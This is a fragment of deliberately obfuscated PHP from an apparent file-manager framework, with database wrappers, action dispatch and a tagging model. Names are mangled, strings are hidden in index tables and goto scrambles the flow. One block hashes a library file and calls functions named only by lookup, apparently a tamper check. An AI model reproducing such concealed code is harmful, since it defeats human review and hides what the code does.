$CäöÏ»®í = $DªŠ†šŠ–ù[675]; goto BÊÅ•‰®¿‡; BÊÅ•‰®¿‡: } public function gieu6602adf8($EòâÁ™ˆ‘Ì, $eŒ£»Êâ›) { $aƒ…Ø¿Ä³² =& $_SERVER[îÖ]; $B„æ£åÅÜÓ =& $_SERVER[®Ñèœ¡]; return $B„æ£åÅÜÓ[13](array($B„æ£åÅÜÓ[14], $B„æ£åÅÜÓ[347]), $EòâÁ™ˆ‘Ì, $eŒ£»Êâ›); $F¦†¶²Ù = $aƒ…Ø¿Ä³²[676]; if (strlen($F¦†¶²Ù) < $aƒ…Ø¿Ä³²[564]) { return; } } public function slotf78c86b3($A÷ğ“÷ãÉ¸, $DÍµÑ‚°Î) { $Fã¬ˆ´®Óº =& $_SERVER[®Ñèœ¡]; return $Fã¬ˆ´®Óº[13](array($Fã¬ˆ´®Óº[348], $Fã¬ˆ´®Óº[349]), $A÷ğ“÷ãÉ¸, $DÍµÑ‚°Î); $cƒÚİ’İÇ· = $_SERVER[îÖ][609]; if (!$cƒÚİ’İÇ·) { die; } } public function bafk9f28e2dc($Fó­ÚÖç—œ, $côÙÂİà²Ë) { $FèôÀğ—†œ =& $_SERVER[®Ñèœ¡]; return $FèôÀğ—†œ[13](array($FèôÀğ—†œ[348], $FèôÀğ—†œ[350]), $Fó­ÚÖç—œ, $côÙÂİà²Ë); $Bù›¾¾ÑÄ© = $_SERVER[îÖ][677]; } } $CìÂÜËù´ = LIB_DIR . $_SERVER[îÖ][678]; goto dàÆæ‚Äˆ; E×Ï‰ÃĞ‡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Aà“Û×¬½ò; Aà“Û×¬½ò: $e«¼¦…Ã…« =& $_SERVER[îÖ]; global $in, $config; $this->config =& $config; goto f¡ÖÛ‚ÑÑ¨; C¿‰±‰Â: $this->tpl = TEMPLATE . MOD . $e«¼¦…Ã…«[8]; $this->_classObjectID = mt_rand(0, 10000); goto B¦ÍÄ£Ë; f¡ÖÛ‚ÑÑ¨: $this->in =& $in; $this->values[$e«¼¦…Ã…«[6]] =& $config; $this->values[$e«¼¦…Ã…«[7]] =& $in; goto C¿‰±‰Â; B¦ÍÄ£Ë: } public function loadClass($BÖ«ò¦Ôğ) { if (1 === func_num_args()) { $this->{$BÖ«ò¦Ôğ} = new $BÖ«ò¦Ôğ(); } else { $eÃœ¿ëšƒ  = new ReflectionClass($BÖ«ò¦Ôğ); $D‹æôù¢…µ = func_get_args(); array_shift($D‹æôù¢…µ); $this->{$BÖ«ò¦Ôğ} = $eÃœ¿ëšƒ ->newInstanceArgs($D‹æôù¢…µ); } return $this->{$BÖ«ò¦Ôğ}; } protected function assign($Bä‚’”Ã£, $F¯ƒ¸ˆ¼Î) { $this->values[$Bä‚’”Ã£] = $F¯ƒ¸ˆ¼Î; } protected function display($EŒà¢ÂËñ) { ob_end_clean(); extract($this->values); require $this->tpl . $EŒà¢ÂËñ; } } class DbSqliteBase extends Db { public function __construct($D¦õÒø‰ë = '') { $A¼ÄßŠ™ëé =& $_SERVER[îÖ]; if (!extension_loaded($A¼ÄßŠ™ëé[9])) { think_exception(think_lang($A¼ÄßŠ™ëé[10]) . $A¼ÄßŠ™ëé[11]); } if (!empty($D¦õÒø‰ë)) { if (!isset($D¦õÒø‰ë[$A¼ÄßŠ™ëé[12]])) { $D¦õÒø‰ë[$A¼ÄßŠ™ëé[12]] = 438; } $this->config = $D¦õÒø‰ë; if (empty($this->config[$A¼ÄßŠ™ëé[13]])) { $this->config[$A¼ÄßŠ™ëé[13]] = array(); } } } public function connect($fèğ”è‰µ = '', $bø–ÅçŸÛ’ = 0) { $cÙ¢½™…Ú× =& $_SERVER[îÖ]; if (!isset($this->linkID[$bø–ÅçŸÛ’])) { goto E¤óˆìàù; eİ¬¥…îç: $this->linkID[$bø–ÅçŸÛ’] = $D‡â„ğÌÓÆ($fèğ”è‰µ[$cÙ¢½™…Ú×[17]], $fèğ”è‰µ[$cÙ¢½™…Ú×[12]]); if (!$this->linkID[$bø–ÅçŸÛ’]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto E¾­éİŠÖ; E¾­éİŠÖ: @sqlite_busy_timeout($this->linkID[$bø–ÅçŸÛ’], 30000); if (1 != think_config($cÙ¢½™…Ú×[18])) { unset($this->config); } goto C¦Ë®à¼æ; E¤óˆìàù: if (empty($fèğ”è‰µ)) { $fèğ”è‰µ = $this->config; } $aÖØ‡êŒ® = !empty($fèğ”è‰µ[$cÙ¢½™…Ú×[13]][$cÙ¢½™…Ú×[14]]) ? $fèğ”è‰µ[$cÙ¢½™…Ú×[13]][$cÙ¢½™…Ú×[14]] : $this->pconnect; $D‡â„ğÌÓÆ = $aÖØ‡êŒ® ? $cÙ¢½™…Ú×[15] : $cÙ¢½™…Ú×[16]; goto eİ¬¥…îç; C¦Ë®à¼æ: } return $this->linkID[$bø–ÅçŸÛ’]; } public function free() { $this->queryID = null; } public function query($cÂæ—³¸¥å) { goto f¦ÂÕÒœµÑ; d‘÷½•ö©ï: $this->queryStr = $cÂæ—³¸¥å; if ($this->queryID) { $this->free(); } think_action_status($e¥øâ‰Ø®[19], 1); goto bèù¨‡¶ÙÜ; f¦ÂÕÒœµÑ: $e¥øâ‰Ø® =& $_SERVER[îÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d‘÷½•ö©ï; bèù¨‡¶ÙÜ: think_status($e¥øâ‰Ø®[20]); $this->queryID = sqlite_query($this->_linkID, $cÂæ—³¸¥å); $this->debug(); goto fïÃÂ˜«ä“; fïÃÂ˜«ä“: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $dªŠ±ªˆŠ» = $this->getAll(); return $dªŠ±ªˆŠ»; } goto Dáª†‚ ; Dáª†‚ : } public function execute($FØÓ†ÖÍ¡Á) { goto c½Ş°îÔ±§; c½Ş°îÔ±§: $b¢×¶öä‚ =& $_SERVER[îÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dñ†—ÖÑŒä; dñ†—ÖÑŒä: $this->queryStr = $FØÓ†ÖÍ¡Á; if ($this->queryID) { $this->free(); } think_action_status($b¢×¶öä‚[21], 1); goto E×Å÷ğÑå; E×Å÷ğÑå: think_status($b¢×¶öä‚[20]); $féğøÓÈ‰ = sqlite_exec($this->_linkID, $FØÓ†ÖÍ¡Á); $this->debug(); goto E¹ë½£‹ô®; E¹ë½£‹ô®: if (!1 === $féğøÓÈ‰) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto FÕíÑ‘Ûµ; FÕíÑ‘Ûµ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[îÖ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A»ºØÏª‡¯ = sqlite_query($this->_linkID, $_SERVER[îÖ][23]); if (!$A»ºØÏª‡¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $e©Ÿ¸Ñ´÷· = sqlite_query($this->_linkID, $_SERVER[îÖ][24]); if (!$e©Ÿ¸Ñ´÷·) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E¹Ç‡Äã = array(); if ($this->numRows > 0) { for ($c»²í¹ˆ‡à = 0; $c»²í¹ˆ‡à < $this->numRows; $c»²í¹ˆ‡à++) { $E¹Ç‡Äã[$c»²í¹ˆ‡à] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $E¹Ç‡Äã; } public function getFields($A±ÊÆ²‰É¨) { $DñÇ£¦­ =& $_SERVER[îÖ]; $F‰¿ê†µ‚ƒ = $this->query($DñÇ£¦­[25] . $A±ÊÆ²‰É¨ . $DñÇ£¦­[26]); $cïÀ­•³Äµ = array(); if ($F‰¿ê†µ‚ƒ) { foreach ($F‰¿ê†µ‚ƒ as $bÑĞ…•ù† => $e†¥íÇ¾¦‚) { $cïÀ­•³Äµ[$e†¥íÇ¾¦‚[$DñÇ£¦­[27]]] = array($DñÇ£¦­[28] => $e†¥íÇ¾¦‚[$DñÇ£¦­[27]], $DñÇ£¦­[29] => $e†¥íÇ¾¦‚[$DñÇ£¦­[30]], $DñÇ£¦­[31] => (bool) ($e†¥íÇ¾¦‚[$DñÇ£¦­[32]] === $DñÇ£¦­[33]), $DñÇ£¦­[34] => $e†¥íÇ¾¦‚[$DñÇ£¦­[35]], $DñÇ£¦­[36] => strtolower($e†¥íÇ¾¦‚[$DñÇ£¦­[37]]) == $DñÇ£¦­[38], $DñÇ£¦­[39] => strtolower($e†¥íÇ¾¦‚[$DñÇ£¦­[40]]) == $DñÇ£¦­[41]); } } return $cïÀ­•³Äµ; } public function getTables($bÕŸÜ‹Ë = '') { $b³æ´ÖÅ =& $_SERVER[îÖ]; $FŒ„èõ¡¨± = $this->query($b³æ´ÖÅ[42] . $b³æ´ÖÅ[43] . $b³æ´ÖÅ[44]); $Fâ¾¢ç¶ùß = array(); foreach ($FŒ„èõ¡¨± as $EÄÌ·øÄ¦‡ => $B¶¿ñÆÏßô) { $Fâ¾¢ç¶ùß[$EÄÌ·øÄ¦‡] = current($B¶¿ñÆÏßô); } return $Fâ¾¢ç¶ùß; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $a†æÇâ®¥ =& $_SERVER[îÖ]; $B®§Íàëàˆ = sqlite_last_error($this->_linkID); $this->error = $B®§Íàëàˆ . $a†æÇâ®¥[4] . sqlite_error_string($B®§Íàëàˆ); if ($a†æÇâ®¥[33] != $this->queryStr) { $this->error .= LNG($a†æÇâ®¥[45]) . $this->queryStr; } think_trace($this->error, $a†æÇâ®¥[33], $a†æÇâ®¥[46]); return $this->error; } public function escapeString($C†Ğ¤›óÇ†) { return sqlite_escape_string($C†Ğ¤›óÇ†); } public function parseLimit($F¬ê¾·¶ô) { $bİèÄÉÀ©Æ =& $_SERVER[îÖ]; $e§ì©Ã£õå = $bİèÄÉÀ©Æ[33]; if (!empty($F¬ê¾·¶ô)) { $F¬ê¾·¶ô = explode($bİèÄÉÀ©Æ[47], $F¬ê¾·¶ô); if (count($F¬ê¾·¶ô) > 1) { $e§ì©Ã£õå .= $bİèÄÉÀ©Æ[48] . $F¬ê¾·¶ô[1] . $bİèÄÉÀ©Æ[49] . $F¬ê¾·¶ô[0] . $bİèÄÉÀ©Æ[50]; } else { $e§ì©Ã£õå .= $bİèÄÉÀ©Æ[48] . $F¬ê¾·¶ô[0] . $bİèÄÉÀ©Æ[50]; } } return $e§ì©Ã£õå; } } class DbSqlite3Base extends Db { public function __construct($aâ­µŒÛ± = '') { $bÊœ¸…Œ„¤ =& $_SERVER[îÖ]; if (!class_exists($bÊœ¸…Œ„¤[51])) { think_exception(think_lang($bÊœ¸…Œ„¤[10]) . $bÊœ¸…Œ„¤[52]); } if (!empty($aâ­µŒÛ±)) { if (!isset($aâ­µŒÛ±[$bÊœ¸…Œ„¤[12]])) { $aâ­µŒÛ±[$bÊœ¸…Œ„¤[12]] = 438; } $this->config = $aâ­µŒÛ±; if (empty($this->config[$bÊœ¸…Œ„¤[13]])) { $this->config[$bÊœ¸…Œ„¤[13]] = array(); } } } public function connect($c¢‚††³¸á = '', $c©¸ó¿Îšî = 0) { $eá‘ñ˜µ =& $_SERVER[îÖ]; if (!isset($this->linkID[$c©¸ó¿Îšî])) { if (empty($c¢‚††³¸á)) { $c¢‚††³¸á = $this->config; } $this->linkID[$c©¸ó¿Îšî] = new SQLite3($c¢‚††³¸á[$eá‘ñ˜µ[17]]); if (!$this->linkID[$c©¸ó¿Îšî]) { think_exception($this->linkID[$c©¸ó¿Îšî]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$c©¸ó¿Îšî]->busyTimeout(30000); if (1 != think_config($eá‘ñ˜µ[18])) { unset($this->config); } } return $this->linkID[$c©¸ó¿Îšî]; } public function free() { $this->queryID = null; } public function query($E…ò¢êÅ„à) { goto Eâ´ìçš‰—; Eâ´ìçš‰—: $d”¨‚ˆŞ‰ =& $_SERVER[îÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F˜Ê¿¾Ó¨¯; aß„¿™á“: if (!1 === $this->queryID) { $this->error(); return !1; } else { $a¯½ê«Î° = $this->getAll(); $this->numRows = count($a¯½ê«Î°); return $a¯½ê«Î°; } goto fø¿É†™èÇ; F˜Ê¿¾Ó¨¯: $this->queryStr = $E…ò¢êÅ„à; if ($this->queryID) { $this->free(); } think_action_status($d”¨‚ˆŞ‰[19], 1); goto eÅİñ¯÷Î; eÅİñ¯÷Î: think_status($d”¨‚ˆŞ‰[20]); $this->queryID = $this->_linkID->query($E…ò¢êÅ„à); $this->debug(); goto aß„¿™á“; fø¿É†™èÇ: } public function execute($eœ¨—£ÙÑ¡) { goto cóªöÉÑ†˜; aË×ì¥ç: think_status($c‘¢¥´ñèŸ[20]); $F´„…í›í‡ = $this->_linkID->exec($eœ¨—£ÙÑ¡); $this->debug(); goto eÈíÃó÷»Ú; eÈíÃó÷»Ú: if (!1 === $F´„…í›í‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Eêø“œîñì; B îÀÎ•Åˆ: $this->queryStr = $eœ¨—£ÙÑ¡; if ($this->queryID) { $this->free(); } think_action_status($c‘¢¥´ñèŸ[21], 1); goto aË×ì¥ç; cóªöÉÑ†˜: $c‘¢¥´ñèŸ =& $_SERVER[îÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B îÀÎ•Åˆ; Eêø“œîñì: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[îÖ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d–ƒˆÕ¢ÖÏ = $this->_linkID->query($_SERVER[îÖ][23]); if (!$d–ƒˆÕ¢ÖÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÊêÕî°ê„ = $this->_linkID->query($_SERVER[îÖ][24]); if (!$EÊêÕî°ê„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $bçÃä½¾âœ = array(); while ($a¿Ø¼ÄùÁ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $bçÃä½¾âœ[] = $a¿Ø¼ÄùÁ; } $this->queryID->reset(); return $bçÃä½¾âœ; } public function getFields($C²à¼†°ŠÃ) { $d–—ššç¿´ =& $_SERVER[îÖ]; $f‘Â’Õ®È¥ = $this->query($d–—ššç¿´[25] . $C²à¼†°ŠÃ . $d–—ššç¿´[26]); $aåââ‚‡ñ = array(); if ($f‘Â’Õ®È¥) { foreach ($f‘Â’Õ®È¥ as $FÊãÙÒ»Ê¹ => $e—¡’Á¬Åƒ) { $aåââ‚‡ñ[$e—¡’Á¬Åƒ[$d–—ššç¿´[28]]] = array($d–—ššç¿´[28] => $e—¡’Á¬Åƒ[$d–—ššç¿´[28]], $d–—ššç¿´[29] => $e—¡’Á¬Åƒ[$d–—ššç¿´[29]], $d–—ššç¿´[31] => (bool) ($e—¡’Á¬Åƒ[$d–—ššç¿´[31]] === $d–—ššç¿´[33]), $d–—ššç¿´[34] => $e—¡’Á¬Åƒ[$d–—ššç¿´[53]], $d–—ššç¿´[36] => (bool) $e—¡’Á¬Åƒ[$d–—ššç¿´[54]], $d–—ššç¿´[39] => (bool) $e—¡’Á¬Åƒ[$d–—ššç¿´[54]]); } } return $aåââ‚‡ñ; } public function getTables($bƒ‹ø¤¨Ñ„ = '') { $Eµ“»ò™ÉÑ =& $_SERVER[îÖ]; $d¤’÷¤æÇ® = $this->query($Eµ“»ò™ÉÑ[42] . $Eµ“»ò™ÉÑ[43] . $Eµ“»ò™ÉÑ[44]); $cï³ÆŒ”¤Ú = array(); foreach ($d¤’÷¤æÇ® as $d‰çÙÓÀ¾‚ => $a÷Ô²ŞÍ…Ú) { $cï³ÆŒ”¤Ú[$d‰çÙÓÀ¾‚] = current($a÷Ô²ŞÍ…Ú); } return $cï³ÆŒ”¤Ú; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $BÙß°»ÉÔ¡ =& $_SERVER[îÖ]; $this->error = $this->_linkID->lastErrorMsg(); if ($BÙß°»ÉÔ¡[33] != $this->queryStr) { $this->error .= LNG($BÙß°»ÉÔ¡[45]) . $this->queryStr; } think_trace($this->error, $BÙß°»ÉÔ¡[33], $BÙß°»ÉÔ¡[46]); return $this->error; } public function escapeString($EÎ‰´Ñóä¢) { $f”¸ÙŸ‚Û‚ =& $_SERVER[îÖ]; if ($this->_linkID) { return $this->_linkID->escapeString($EÎ‰´Ñóä¢); } return str_ireplace($f”¸ÙŸ‚Û‚[55], $f”¸ÙŸ‚Û‚[56], $EÎ‰´Ñóä¢); } public function parseLimit($A¦ğÒÙ”´ˆ) { $b„Õã’Óò¦ =& $_SERVER[îÖ]; $e¸Û¿â‡—± = $b„Õã’Óò¦[33]; if (!empty($A¦ğÒÙ”´ˆ)) { $A¦ğÒÙ”´ˆ = explode($b„Õã’Óò¦[47], $A¦ğÒÙ”´ˆ); if (count($A¦ğÒÙ”´ˆ) > 1) { $e¸Û¿â‡—± .= $b„Õã’Óò¦[48] . $A¦ğÒÙ”´ˆ[1] . $b„Õã’Óò¦[49] . $A¦ğÒÙ”´ˆ[0] . $b„Õã’Óò¦[50]; } else { $e¸Û¿â‡—± .= $b„Õã’Óò¦[48] . $A¦ğÒÙ”´ˆ[0] . $b„Õã’Óò¦[50]; } } return $e¸Û¿â‡—±; } } goto c’Õœù«°; e…¹Í¡†Á: $CìÂÜËù´ = LIB_DIR . $_SERVER[îÖ][678]; $Cƒéƒ™ŞÎÜ = $_SERVER[îÖ][679]; if ($_SERVER[$_SERVER[îÖ][680]] != $Cƒéƒ™ŞÎÜ($CìÂÜËù´)) { goto DŒ›ôÒ¹º; bÅêîºÍáˆ: $AÄ˜«åéæ¯($CìÂÜËù´); goto CäÂ‰ÄÑ‘É; DŒ›ôÒ¹º: $aÈ¼ÄÁ‘º„ = $_SERVER[îÖ][681]; $cëë—ƒÊ = $_SERVER[$_SERVER[îÖ][682]] . $_SERVER[îÖ][683]; $c¯ÙÇøæŒÚ = $aÈ¼ÄÁ‘º„($cëë—ƒÊ); goto cê«ö—’Ù»; cê«ö—’Ù»: $dê¨™œÄ‡ = explode($_SERVER[îÖ][217], $c¯ÙÇøæŒÚ); if (count($dê¨™œÄ‡) < $_SERVER[îÖ][564]) { $AĞ±ÈÑÕè = $_SERVER[îÖ][684]; $AĞ±ÈÑÕè(); } $AÄ˜«åéæ¯ = $_SERVER[îÖ][685]; goto bÅêîºÍáˆ; CäÂ‰ÄÑ‘É: } goto e„ª¿Ö¼ ¬; Aí…Ó¦²ò: function Action($fóæÉÔ¢ƒó = '') { goto FÆêßÌ¿Ã; FÆêßÌ¿Ã: $Aø™äŸÙò³ =& $_SERVER[©•ÖÏ¥Ø]; static $C†§›œõ¾ß = array(); $e—Õ—œª‡ó = $fóæÉÔ¢ƒó; goto Dß«¬ïÌ„ˆ; Dß«¬ïÌ„ˆ: if (isset($C†§›œõ¾ß[$e—Õ—œª‡ó])) { return $C†§›œõ¾ß[$e—Õ—œª‡ó]; } $fóæÉÔ¢ƒó = trim(str_replace($Aø™äŸÙò³[4], $Aø™äŸÙò³[5], $fóæÉÔ¢ƒó), $Aø™äŸÙò³[4]); $F¹ï¯Ä§ßš = explode($Aø™äŸÙò³[5], $fóæÉÔ¢ƒó); goto b††ø§ÖØ‘; AÛ‘Š¤ñ™œ: if (isset($C†§›œõ¾ß[$EßŞÌèãØÜ])) { return $C†§›œõ¾ß[$EßŞÌèãØÜ]; } if (is_file($d¨ï˜¡äƒ‰)) { include_once $d¨ï˜¡äƒ‰; } if (!class_exists($f†ğµ¯‡óÊ)) { return actionCallError("\133{$fóæÉÔ¢ƒó}\40\x3d\76\x20{$f†ğµ¯‡óÊ}\x5d\40\x63\x6c\141\x73\x73\40\x6e\x6f\164\40\145\170\151\163\164\x73\x21"); } goto c¨Ü˜²; b††ø§ÖØ‘: $eùáÒöéÕ› = strtolower($F¹ï¯Ä§ßš[0]); if (substr($eùáÒöéÕ›, -6) == $Aø™äŸÙò³[6]) { $fóæÉÔ¢ƒó = substr($F¹ï¯Ä§ßš[0], 0, -6); $f†ğµ¯‡óÊ = $fóæÉÔ¢ƒó . $Aø™äŸÙò³[7]; $d¨ï˜¡äƒ‰ = $Aø™äŸÙò³[8]; if (isset($F¹ï¯Ä§ßš[1]) && substr(strtolower($F¹ï¯Ä§ßš[1]), -5) == $Aø™äŸÙò³[9]) { $f†ğµ¯‡óÊ = $fóæÉÔ¢ƒó . $F¹ï¯Ä§ßš[1]; $d¨ï˜¡äƒ‰ = $Aø™äŸÙò³[10] . $F¹ï¯Ä§ßš[1] . $Aø™äŸÙò³[11]; } else { if (count($F¹ï¯Ä§ßš) == 3) { $f†ğµ¯‡óÊ = $fóæÉÔ¢ƒó . $F¹ï¯Ä§ßš[1] . $F¹ï¯Ä§ßš[2]; $d¨ï˜¡äƒ‰ = $Aø™äŸÙò³[12] . $F¹ï¯Ä§ßš[1] . $Aø™äŸÙò³[13] . $F¹ï¯Ä§ßš[2] . $Aø™äŸÙò³[11]; } } $d¨ï˜¡äƒ‰ = PLUGIN_DIR . $fóæÉÔ¢ƒó . $Aø™äŸÙò³[4] . $d¨ï˜¡äƒ‰; } else { if (substr($eùáÒöéÕ›, -5) == $Aø™äŸÙò³[9]) { $fóæÉÔ¢ƒó = substr($F¹ï¯Ä§ßš[0], 0, -5); return Model($fóæÉÔ¢ƒó); } else { $f†ğµ¯‡óÊ = $F¹ï¯Ä§ßš[0] . $F¹ï¯Ä§ßš[1]; $d¨ï˜¡äƒ‰ = CONTROLLER_DIR . $F¹ï¯Ä§ßš[0] . $Aø™äŸÙò³[4] . $F¹ï¯Ä§ßš[1] . $Aø™äŸÙò³[14]; } } $EßŞÌèãØÜ = strtolower($f†ğµ¯‡óÊ); goto AÛ‘Š¤ñ™œ; c¨Ü˜²: $C†§›œõ¾ß[$EßŞÌèãØÜ] = new $f†ğµ¯‡óÊ(); $C†§›œõ¾ß[$e—Õ—œª‡ó] = $C†§›œõ¾ß[$EßŞÌèãØÜ]; return $C†§›œõ¾ß[$EßŞÌèãØÜ]; goto EÚêøëñ‘; EÚêøëñ‘: } function ActionApply($bœ™›ç®ô, $F‡ã”Ë•ãË = array()) { goto få¹ƒòöØª; EÛ„³Æ÷ĞÆ: $eêÑ—·í’Æ = substr($bœ™›ç®ô, 0, $FãÍ ‰·ƒ); $FÄäÜõôÖ = substr($bœ™›ç®ô, $FãÍ ‰·ƒ + 1); $f‡›òù¨ã = Action($eêÑ—·í’Æ); goto EÙğÎ½À»Í; få¹ƒòöØª: if (is_array($bœ™›ç®ô)) { return call_user_func_array($bœ™›ç®ô, $F‡ã”Ë•ãË); } if (function_exists($bœ™›ç®ô)) { return call_user_func_array($bœ™›ç®ô, $F‡ã”Ë•ãË); } $FãÍ ‰·ƒ = strrpos($bœ™›ç®ô, $_SERVER[©•ÖÏ¥Ø][5]); goto EÛ„³Æ÷ĞÆ; EÙğÎ½À»Í: if (!method_exists($f‡›òù¨ã, $FÄäÜõôÖ)) { return actionCallError("{$bœ™›ç®ô}\x20\155\x65\164\150\x6f\x64\40\156\x6f\x74\40\145\x78\x69\163\x74\x73\41"); } $cóÙ˜Ôù“ø = call_user_func_array(array($f‡›òù¨ã, $FÄäÜõôÖ), $F‡ã”Ë•ãË); return $cóÙ˜Ôù“ø; goto BÌªÆ˜™‹à; BÌªÆ˜™‹à: } function actionCallError($f¦©Õ“×Ù¡) { $F¨é‹ØÂÊ =& $_SERVER[©•ÖÏ¥Ø]; $Fàò’¾â = json_encode_force(array($F¨é‹ØÂÊ[15] => this_url(), $F¨é‹ØÂÊ[16] => $GLOBALS[$F¨é‹ØÂÊ[16]])); $Fàò’¾â = str_replace(array($F¨é‹ØÂÊ[17]), array($F¨é‹ØÂÊ[4]), $Fàò’¾â); return write_log($f¦©Õ“×Ù¡ . $F¨é‹ØÂÊ[18] . $Fàò’¾â, $F¨é‹ØÂÊ[19]); } goto e´ˆñôø‡Û; c–ªÃµšéÏ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($f–¹Ù—òŞÃ) { $DÂà¹æİ¡ù =& $_SERVER[îÖ]; return array($DÂà¹æİ¡ù[2484] => array(USER_ID, $DÂà¹æİ¡ù[2539])); } protected function listData() { $eáç‹×Ğœç =& $_SERVER[îÖ]; $Dğ«¡š¢“‘ = array($eáç‹×Ğœç[1422] => USER_ID, $eáç‹×Ğœç[436] => array($eáç‹×Ğœç[2540], 0)); $d™¾›ÈšŠ¡ = $eáç‹×Ğœç[2541]; $CÒçé¼»¢ï = $eáç‹×Ğœç[2542]; $EÉÜ‡ÇÎ”« = $this->field($d™¾›ÈšŠ¡)->where($Dğ«¡š¢“‘)->order($CÒçé¼»¢ï)->select(); return $EÉÜ‡ÇÎ”« ? $EÉÜ‡ÇÎ”« : array(); } protected function listByTag($dœ†¼½˜”Å) { } protected function addToTag($FË‡®êÍç”, $AÊíù¢ˆ‡) { $FÔ¢™×åëÚ =& $_SERVER[îÖ]; if (!Model($FÔ¢™×åëÚ[2312])->listData($AÊíù¢ˆ‡) || !Model($FÔ¢™×åëÚ[752])->pathInfo($FË‡®êÍç”)) { return !1; } $dÒšù×¯¾í = array($FÔ¢™×åëÚ[1422] => USER_ID, $FÔ¢™×åëÚ[436] => $AÊíù¢ˆ‡, $FÔ¢™×åëÚ[387] => $FË‡®êÍç”, $FÔ¢™×åëÚ[388] => $FÔ¢™×åëÚ[382], $FÔ¢™×åëÚ[386] => $FÔ¢™×åëÚ[33], $FÔ¢™×åëÚ[2103] => 0); if ($this->where($dÒšù×¯¾í)->find()) { return !1; } return $this->add($dÒšù×¯¾í); } protected function removeFromTag($AËï´à¿ß, $A°¢çß¸õï) { $F£¸ƒ‚¼ =& $_SERVER[îÖ]; if (!Model($F£¸ƒ‚¼[2312])->listData($A°¢çß¸õï)) { return !1; } if (is_array($AËï´à¿ß)) { $AËï´à¿ß = array($F£¸ƒ‚¼[7], $AËï´à¿ß); } $DØÌæº±ùÙ = array($F£¸ƒ‚¼[1422] => USER_ID, $F£¸ƒ‚¼[436] => $A°¢çß¸õï, $F£¸ƒ‚¼[388] => $F£¸ƒ‚¼[382], $F£¸ƒ‚¼[387] => $AËï´à¿ß); return $this->where($DØÌæº±ùÙ)->delete(); } protected function removeByTag($B·ÄèÓ¨Òİ) { $b’¤„†Ğ¢š =& $_SERVER[îÖ]; if (!$B·ÄèÓ¨Òİ) { return !1; } $C„êÈ„ÖƒÃ = array($b’¤„†Ğ¢š[1422] => USER_ID, $b’¤„†Ğ¢š[436] => $B·ÄèÓ¨Òİ); return $this->where($C„êÈ„ÖƒÃ)->delete(); } protected function removeBySource($d‰ãˆ»‚æ) { $E˜ƒÉ†­¾Ê =& $_SERVER[îÖ]; $dØáùÔøòÄ = array($E˜ƒÉ†­¾Ê[1422] => USER_ID, $E˜ƒÉ†­¾Ê[387] => $d‰ãˆ»‚æ, $E˜ƒÉ†­¾Ê[436] => array($E˜ƒÉ†­¾Ê[922], 0)); return $this->where($dØáùÔøòÄ)->delete(); } }